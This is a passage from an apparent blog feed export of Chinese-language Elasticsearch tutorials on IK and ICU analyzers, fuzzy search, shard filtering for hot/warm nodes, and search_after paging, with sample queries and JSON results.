: 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.15965709, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;chinese&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 0.15965709, &quot;_source&quot; : &#123; &quot;content&quot; : &quot;北京，你好&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;chinese&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.100605845, &quot;_source&quot; : &#123; &quot;content&quot; : &quot;我爱北京天安门&quot; &#125; &#125; ] &#125;&#125;因为两个文档里都含有“北京”，我们可以看出来两个文档都被显示出来了。我们同时做另外一个搜索：12345678GET /chinese/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;天安门&quot; &#125; &#125;&#125;那么显示的结果是：12345678910111213141516171819202122232425262728&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.73898095, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;chinese&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.73898095, &quot;_source&quot; : &#123; &quot;content&quot; : &quot;我爱北京天安门&quot; &#125; &#125; ] &#125;&#125;因为“天安门”只出现在第二个文档里，所以，我们可以看出来只有一个结果。我们也同时做另外一个搜索：12345678GET /chinese/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;北京天安门&quot; &#125; &#125;&#125;在这里，我们来搜索“北京天安门”。请注意我们在mapping中使用了1&quot;search_analyzer&quot;: &quot;ik_smart&quot;也就是说，search_analyzer会把我们的“北京天安门”，分解成两个词“北京”及“天安门”。这两个词将被用于搜索。通常对于match来说是OR关系，也就是说只要匹配到“北京”或“天安门”，这两个之中的任何一个，那么就是匹配：12345678910111213141516171819202122232425262728293031323334353637&#123; &quot;took&quot; : 3, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.7268042, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;chinese&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.7268042, &quot;_source&quot; : &#123; &quot;content&quot; : &quot;我爱北京天安门&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;chinese&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 0.22920427, &quot;_source&quot; : &#123; &quot;content&quot; : &quot;北京，你好&quot; &#125; &#125; ] &#125;&#125;上面显示的结果显示“我爱北京天安门”是最贴切的搜索结果。参考：【1】https://github.com/medcl/elasticsearch-analysis-ik]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lasticsearch：ICU分词器介绍]]></title>
    <url>%2F2020%2F01%2F02%2Flasticsearch%EF%BC%9AICU%E5%88%86%E8%AF%8D%E5%99%A8%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[ICU Analysis插件是一组将Lucene ICU模块集成到Elasticsearch中的库。 本质上，ICU的目的是增加对Unicode和全球化的支持，以提供对亚洲语言更好的文本分割分析。 从Elasticsearch的角度来看，此插件提供了文本分析中的新组件，如下表所示:安装我们可以首先到Elasticsearch的安装目录打入如下的命令：123456$ pwd/Users/liuxg/elastic/elasticsearch-7.3.0(base) localhost:elasticsearch-7.3.0 liuxg$ ./bin/elasticsearch-plugin listanalysis-icuanalysis-ikpinyin上面显示我已经安装好了三个插件。上面的analysis-ik及pinyin都是为中文而准备的。注意：如果你们在使用上面的elasticsearch-plug list命名出现如下的错误的话：那么请使用如下的命令来删除在当前目录下的.DS_Store目录：1sudo find /Path/to/your/elasticsearch-folder -name &quot;.DS_Store&quot; -depth -exec rm &#123;&#125; \;然后重新运行上面的命令就不会有问题了。上面显示我已经安装好了。如果在你的电脑里没有安装好，可以使用如下的命令来进行安装：1./bin/elasticsearch-plugin install analysis-icu上面的命令在Elasticsearch的安装目录里进行运行。等安装好后，我们需要重新启动Elasticsearch让它起作用。重新运行：1./bin/elasticsearch-plugin list来检查analysis-icu是否已经被成功安装好了。例子等我们完全安装好了analysis_icu，那么，我们可以使用如下的例子在Kibana中来做一个实验：12345POST _analyze &#123; &quot;text&quot;: &quot;我爱北京天安门&quot;, &quot;analyzer&quot;: &quot;icu_analyzer&quot;&#125;那么显示的结果是：上面显示，我们analysis可以正确地帮我们把中文词语安装中文的分词方法正确地进行分词。我们可以和standard分词器来进行一个比较：我们从上面可以看出来，在默认的情况下，icu_analyzer通常是一个及以上的字符的token，而standard的analyzer只有一个字符。通过更改字符过滤器和token的方法和模式参数，ICU分析器可以具有多种自定义变量类型。 下表描述了不同类型的ICU分析仪的组合：让我们尝试nfkd_normalized分析器。 遵循定义并在Kibana Dev Tools控制台中对其进行测试。 响应显示在以下屏幕截图中。 但是，由于使用nfkd_normalized分析器和icu_analyzer分析器，我们无法在结果中找到任何差异：123456POST _analyze &#123; &quot;text&quot;: &quot;股市投资稳赚不赔必修课：如何做好仓位管理和情绪管理&quot;, &quot;char_filter&quot;: [&#123;&quot;type&quot;: &quot;icu_normalizer&quot;, &quot;name&quot;: &quot;nfkc&quot;, &quot;mode&quot;:&quot;decompose&quot;&#125;], &quot;tokenizer&quot;: &quot;icu_tokenizer&quot;&#125;运行结果：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;股市&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 2, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;投资&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 4, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;稳赚&quot;, &quot;start_offset&quot; : 4, &quot;end_offset&quot; : 6, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;不&quot;, &quot;start_offset&quot; : 6, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 3 &#125;, &#123; &quot;token&quot; : &quot;赔&quot;, &quot;start_offset&quot; : 7, &quot;end_offset&quot; : 8, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 4 &#125;, &#123; &quot;token&quot; : &quot;必修&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 10, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 5 &#125;, &#123; &quot;token&quot; : &quot;课&quot;, &quot;start_offset&quot; : 10, &quot;end_offset&quot; : 11, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 6 &#125;, &#123; &quot;token&quot; : &quot;如何&quot;, &quot;start_offset&quot; : 12, &quot;end_offset&quot; : 14, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 7 &#125;, &#123; &quot;token&quot; : &quot;做好&quot;, &quot;start_offset&quot; : 14, &quot;end_offset&quot; : 16, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 8 &#125;, &#123; &quot;token&quot; : &quot;仓&quot;, &quot;start_offset&quot; : 16, &quot;end_offset&quot; : 17, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 9 &#125;, &#123; &quot;token&quot; : &quot;位&quot;, &quot;start_offset&quot; : 17, &quot;end_offset&quot; : 18, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 10 &#125;, &#123; &quot;token&quot; : &quot;管理&quot;, &quot;start_offset&quot; : 18, &quot;end_offset&quot; : 20, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 11 &#125;, &#123; &quot;token&quot; : &quot;和&quot;, &quot;start_offset&quot; : 20, &quot;end_offset&quot; : 21, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 12 &#125;, &#123; &quot;token&quot; : &quot;情绪&quot;, &quot;start_offset&quot; : 21, &quot;end_offset&quot; : 23, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 13 &#125;, &#123; &quot;token&quot; : &quot;管理&quot;, &quot;start_offset&quot; : 23, &quot;end_offset&quot; : 25, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 14 &#125; ]&#125;要使用新定义的分析器，我们必须在Index setting中对其进行定义。请参阅我之前的文章“Elasticsearch: analyzer”。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lasticsearch：fuzzy 搜索(模糊搜索)]]></title>
    <url>%2F2020%2F01%2F02%2Flasticsearch%EF%BC%9Afuzzy%20%E6%90%9C%E7%B4%A2%20%EF%BC%88%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2)%2F</url>
    <content type="text"><![CDATA[在实际的搜索中，我们有时候会打错字，从而导致搜索不到。在Elasticsearch中，我们可以使用fuzziness属性来进行模糊查询，从而达到搜索有错别字的情形。match查询具有“fuziness”属性。它可以被设置为“0”， “1”， “2”或“auto”。“auto”是推荐的选项，它会根据查询词的长度定义距离。Fuzzy query返回包含与搜索词相似的词的文档，以Levenshtein编辑距离测量。编辑距离是将一个术语转换为另一个术语所需的一个字符更改的次数。 这些更改可以包括：更改字符（box→fox）删除字符（black→lack）插入字符（sic→sick）转置两个相邻字符（act→cat）为了找到相似的词，模糊查询会在指定的编辑距离内创建搜索词的所有可能变化或扩展的集合。 查询然后返回每个扩展的完全匹配。例子我们首先输入如下的一个文档到fuzzyindex索引中：1234PUT fuzzyindex/_doc/1&#123; &quot;content&quot;: &quot;I like blue sky&quot;&#125;如果这个时候，我们进行如下的搜索：12345678GET fuzzyindex/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;ski&quot; &#125; &#125;&#125;那么是没有任何被搜索到的结果，这是因为“I like blue sky” 里分词后没有ski这个词。123456789101112131415161718&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 0, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;&#125;这个时候，如果我们使用如下的搜索：1234567891011GET fuzzyindex/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;ski&quot;, &quot;fuzziness&quot;: &quot;1&quot; &#125; &#125; &#125;&#125;那么显示的结果是：12345678910111213141516171819202122232425262728&#123; &quot;took&quot; : 18, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.19178805, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;fuzzyindex&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.19178805, &quot;_source&quot; : &#123; &quot;content&quot; : &quot;I like blue sky&quot; &#125; &#125; ] &#125;&#125;显然是找到我们需要的结果了。这是因为sky和ski时间上是只差别一个字母。同样，如果我们选用“auto”选项看看：1234567891011GET fuzzyindex/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;ski&quot;, &quot;fuzziness&quot;: &quot;auto&quot; &#125; &#125; &#125;&#125;它显示的结果和上面的是一样的。也可以进行匹配。如果我们进行如下的匹配：1234567891011GET fuzzyindex/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;bxxe&quot;, &quot;fuzziness&quot;: &quot;auto&quot; &#125; &#125; &#125;&#125;那么它不能匹配任何的结果，但是，如果我们进行如下的搜索：1234567891011GET fuzzyindex/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;bxxe&quot;, &quot;fuzziness&quot;: &quot;2&quot; &#125; &#125; &#125;&#125;我们也可以使用如下的格式：1234567891011GET /_search&#123; &quot;query&quot;: &#123; &quot;fuzzy&quot;: &#123; &quot;content&quot;: &#123; &quot;value&quot;: &quot;bxxe&quot;, &quot;fuzziness&quot;: &quot;2&quot; &#125; &#125; &#125;&#125;那么它可以显示搜索的结果，这是因为我们能够容许两个编辑的错误。模糊性是拼写错误的简单解决方案，但具有很高的CPU开销和非常低的精度。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/7.4/query-dsl-fuzzy-query.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：运用shard filtering来控制索引分配给哪个节点]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9A%E8%BF%90%E7%94%A8shard%20filtering%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%B4%A2%E5%BC%95%E5%88%86%E9%85%8D%E7%BB%99%E5%93%AA%E4%B8%AA%E8%8A%82%E7%82%B9%2F</url>
    <content type="text"><![CDATA[在我们的实际部署中，我们的各个node（节点）的能力是不一样的。比如有的节点的计算能力比较强，而且配有高性能的存储，速度也比较快，同时我们可能有一些node的能力稍微差一点，比如计算能力及存储器的速度都比较差一点。针对这两种情况，我们其实可以把这两种节点用来做不同的用途：运算能力较强的节点可以用来做indexing（建立索引表格）的工作，而那些能力较差一点的节点，我们可以用来做搜索用途。我们可以把这两种节点分别叫做：hot node：用于支持索引并写入新文档warm node：用于处理不太频繁查询的只读索引这种架构在Elasticsearch中，我们称之为hot/warm架构。Hot node我们可以使用hot node来做indexing：indexing是CPU和IO的密集操作，因此热节点应该是功能强大的服务器比warm node更快的存储Warm node对较旧的只读索引使用热节点：倾向于利用大型附加磁盘（通常是旋转磁盘）大量数据可能需要其他节点才能满足性能要求Shard filteringShard filtering在Elasticsearch中，我们可以利用这个能力来把我们想要的index放入到我们想要的node里。我们可以使用在elasticsearch.yml配置文件中的：node.attr来指定我们node属性：hot或是warm。在index的settings里通过index.routing.allocation来指定索引（index)到一个满足要求的node为节点分配索引有三种规则：就像上面的表格说明的一样：include指的是至少包含其中的一个值；exclude指的是不包含任何值；require指的是必须包含里面索引的值。这些值实际上我们用来标识node的tag。针对自己的配置这些tag可以由厂商自己标识。标识node在上面的图中，我们标识my_temp属性为hot或是warm，表明我们的cluster中分为两类：hot或是warm。在这里特别指出：这里的my_temp，hot及warm都是我们任意取的可以让我们记住的属性及名称。只要在使用时和index.routing.allocation.include index.routing.allocation.exclude及index.routing.allocation.require中的值相对应即可。配置index的settings我们可以通过配置在Index中的settings来分配我们的index到相应的具有哪些属性的node里，比如：123456PUT logs-2019-03&#123; &quot;settings&quot;: &#123; &quot;index.routing.allocation.require.my_temp&quot;: &quot;hot&quot; &#125;&#125;在上面我们通过logs-2019-03的这个index的settings来控制这个index必须分配到具有hot属性的node里。假如我们上面的index logs-2019-03由于一些原因不再是当前的用来做indexing的index，比如我们可以通过rollover API接口来自动滚动我们的index名字。我们可以通过如下的命令把该index移动到warm node里：123456PUT logs-2019-03&#123; &quot;settings&quot;: &#123; &quot;index.routing.allocation.require.my_temp&quot;: &quot;warm&quot; &#125;&#125;这样Elasticsearch会自动帮我们把logs-2019-03索引移动到warm node中，以便直供搜索之用。例子首先，我们我们按照如下的方式来做一个实验，虽然不能应用于实际的生产环境中：按照“如何在Linux，MacOS及Windows上进行安装Elasticsearch”安装好自己的Elasticsearh，但是不要运行Elasticsearch按照“如何在Linux及MacOS上安装Elastic栈中的Kibana”安装好自己的Kibana在我们完成上面的两个安装后，我们分别打开两个terminal，然后分别在两个terminal中运行如下的指令：1./bin/elasticsearch -E node.name=node1 -E node.attr.data=hot -Enode.max_local_storage_nodes=2上面的指令运行一个名字叫做node1的，data属性为hot的node。1./bin/elasticsearch -E node.name=node2 -E node.attr.data=warm -Enode.max_local_storage_nodes=2上面的指令运行一个名字叫做node2的，data属性为hot的warm。我们可以在Kibana里查看我们的nodes：我们可以看出来有两个node正在运行：node1及node2。如果我们想了解这两个node的更多属性，我们可以打入如下的命令：1GET _cat/nodeattrs?v&amp;s=name显示的结果为：我们可以看到node被标识为hot node，而node2被标识为warm node。接下来，我们运用我们上面命令来把我们的logs-2019-03置于我们的hot node里。我们可以通过如下的命令：12345678PUT logs-2019-03&#123; &quot;settings&quot;: &#123; &quot;number_of_shards&quot;: 1, &quot;number_of_replicas&quot;: 0, &quot;index.routing.allocation.require.data&quot;: &quot;hot&quot; &#125;&#125;运行上面的结果后，可以通过如下的命令来查看：1GET _cat/shards/logs-*?v&amp;h=index,shard,prirep,state,node&amp;s=index,shard,prirep显示的结果为：从上面我们可以看出来我们的logs-2019-03是分配到node1上面的。假如我们由于某种原因，想把logs-2019-03分配到node2上面，那么该怎么做呢？我们可以通过如下的命令来实现：1234PUT logs-2019-03/_settings&#123; &quot;index.routing.allocation.require.data&quot;: &quot;warm&quot;&#125;运行上面的指令显示的结果是：显然我们logs-2019-03已经成功地移到node2了。针对硬件的shard filtering上面我们说了，对于node.attr来说，我们可以添加任意的属性。在上面的我们已经使用hot/warm来标识我们的my_temp属性。其实我们也可以同时定义一些能标识硬件的属性my_server，这个属性值可以为small，medium及large。有多个属性组成的集群就像是如下的结构：那么这样的集群里的每个node可能具有不同的属性。我们可以通过如下的方法来分配index到同时具有两个或以上属性的node里:123456789PUT my_index1 &#123; &quot;settings&quot;: &#123; &quot;number_of_shards&quot;: 2, &quot;number_of_replicas&quot;: 1, &quot;index.routing.allocation.include.my_server&quot;: &quot;medium&quot;, &quot;index.routing.allocation.require.my_temp&quot;: &quot;hot&quot; &#125;&#125;如上所示，我们把我们的my_index1分配到这么一个node：这个node必须具有hot属性，同时也具有medium的属性。针对我们上面显示的图片，只有node1满足我们的要求。总结：在今天的这篇文章中，我们介绍了如何使用shard filtering来控制我们的index的分配。在实际的操作中，可能大家会觉得麻烦一点，因为这个比较需要我们自己来管理这个。这个技术可以和我之前的文章“Elasticsearch: rollover API”一起配合使用。Elasticsearch实际已经帮我做好了。在接下来的文章里，我会来介绍如何使用Index life cycle policy来自动管理我们的Index。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：运用search_after来进行深度分页]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9A%E8%BF%90%E7%94%A8search_after%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%BA%A6%E5%88%86%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[在上一篇文章 “Elasticsearch：运用scroll接口对大量数据实现更好的分页”，我们讲述了如何运用scroll接口来对大量数据来进行有效地分页。在那篇文章中，我们讲述了两种方法：from加上size的方法来进行分页运用scroll接口来进行分页对于大量的数据而言，我们尽量避免使用from+size这种方法。这里的原因是index.max_result_window的默认值是10K，也就是说from+size的最大值是1万。搜索请求占用堆内存和时间与from+size成比例，这限制了内存。假如你想hit从990到1000，那么每个shard至少需要1000个文档：为了避免过度使得我们的cluster繁忙，通常Scroll接口被推荐作为深层次的scrolling，但是因为维护scroll上下文也是非常昂贵的，所以这种方法不推荐作为实时用户请求。search_after参数通过提供实时cursor来解决此问题。 我们的想法是使用上一页的结果来帮助检索下一页。我们先输入如下的文档到twitter索引中：12345678910111213POST _bulk&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 1&#125; &#125;&#123;&quot;user&quot;:&quot;双榆树-张三&quot;, &quot;DOB&quot;:&quot;1980-01-01&quot;, &quot;message&quot;:&quot;今儿天气不错啊，出去转转去&quot;,&quot;uid&quot;:2,&quot;age&quot;:20,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市海淀区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.970718&quot;,&quot;lon&quot;:&quot;116.325747&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 2 &#125;&#125;&#123;&quot;user&quot;:&quot;东城区-老刘&quot;, &quot;DOB&quot;:&quot;1981-01-01&quot;, &quot;message&quot;:&quot;出发，下一站云南！&quot;,&quot;uid&quot;:3,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区台基厂三条3号&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.904313&quot;,&quot;lon&quot;:&quot;116.412754&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 3&#125; &#125;&#123;&quot;user&quot;:&quot;东城区-李四&quot;, &quot;DOB&quot;:&quot;1982-01-01&quot;, &quot;message&quot;:&quot;happy birthday!&quot;,&quot;uid&quot;:4,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.893801&quot;,&quot;lon&quot;:&quot;116.408986&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 4&#125; &#125;&#123;&quot;user&quot;:&quot;朝阳区-老贾&quot;,&quot;DOB&quot;:&quot;1983-01-01&quot;, &quot;message&quot;:&quot;123,gogogo&quot;,&quot;uid&quot;:5,&quot;age&quot;:35,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区建国门&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.718256&quot;,&quot;lon&quot;:&quot;116.367910&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 5&#125; &#125;&#123;&quot;user&quot;:&quot;朝阳区-老王&quot;,&quot;DOB&quot;:&quot;1984-01-01&quot;, &quot;message&quot;:&quot;Happy BirthDay My Friend!&quot;,&quot;uid&quot;:6,&quot;age&quot;:50,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区国贸&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.918256&quot;,&quot;lon&quot;:&quot;116.467910&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 6&#125; &#125;&#123;&quot;user&quot;:&quot;虹桥-老吴&quot;, &quot;DOB&quot;:&quot;1985-01-01&quot;, &quot;message&quot;:&quot;好友来了都今天我生日，好友来了,什么 birthday happy 就成!&quot;,&quot;uid&quot;:7,&quot;age&quot;:90,&quot;city&quot;:&quot;上海&quot;,&quot;province&quot;:&quot;上海&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国上海市闵行区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;31.175927&quot;,&quot;lon&quot;:&quot;121.383328&quot;&#125;&#125;这里共有6个文档。假设检索第一页的查询如下所示：123456789101112131415161718192021GET twitter/_search&#123; &quot;size&quot;: 2, &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125;, &quot;sort&quot;: [ &#123; &quot;DOB&quot;: &#123; &quot;order&quot;: &quot;asc&quot; &#125; &#125;, &#123; &quot;user.keyword&quot;: &#123; &quot;order&quot;: &quot;asc&quot; &#125; &#125; ]&#125;显示的结果为：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&#123; &quot;took&quot; : 29, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 5, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;DOB&quot; : &quot;1980-01-01&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125;, &quot;sort&quot; : [ 315532800000, &quot;双榆树-张三&quot; ] &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;东城区-老刘&quot;, &quot;DOB&quot; : &quot;1981-01-01&quot;, &quot;message&quot; : &quot;出发，下一站云南！&quot;, &quot;uid&quot; : 3, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区台基厂三条3号&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.904313&quot;, &quot;lon&quot; : &quot;116.412754&quot; &#125; &#125;, &quot;sort&quot; : [ 347155200000, &quot;东城区-老刘&quot; ] &#125; ] &#125;&#125;上述请求的结果包括每个文档的sort值数组。 这些sort值可以与search_after参数一起使用，以开始返回在这个结果列表之后的任何文档。 例如，我们可以使用上一个文档的sort值并将其传递给search_after以检索下一页结果：12345678910111213141516171819202122232425GET twitter/_search&#123; &quot;size&quot;: 2, &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125;, &quot;search_after&quot;: [ 347155200000, &quot;东城区-老刘&quot; ], &quot;sort&quot;: [ &#123; &quot;DOB&quot;: &#123; &quot;order&quot;: &quot;asc&quot; &#125; &#125;, &#123; &quot;user.keyword&quot;: &#123; &quot;order&quot;: &quot;asc&quot; &#125; &#125; ]&#125;在这里在search_after中，我们把上一个搜索结果的sort值放进来。 显示的结果为：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&#123; &quot;took&quot; : 47, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 5, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;3&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;东城区-李四&quot;, &quot;DOB&quot; : &quot;1982-01-01&quot;, &quot;message&quot; : &quot;happy birthday!&quot;, &quot;uid&quot; : 4, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : 